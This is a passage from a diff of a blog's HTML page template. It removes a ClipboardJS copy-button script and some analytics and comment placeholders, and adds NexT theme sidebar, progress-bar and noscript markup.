-    btn += '<i class="fa-regular fa-clone"></i>';
-    btn += '</span>';
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
-    });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "Copied!");
-      e.clearSelection();
-    })
-  })
-  </script>
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
 
-
-<script src="/js/main.js"></script>
-
-<!-- search -->
-
-<!-- Baidu Analytics -->
-
-<!-- Cloudflare Analytics -->
-
-<!-- Disqus Comments -->
-
-<!-- utterances Comments -->
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
 
 </body>
 </html>
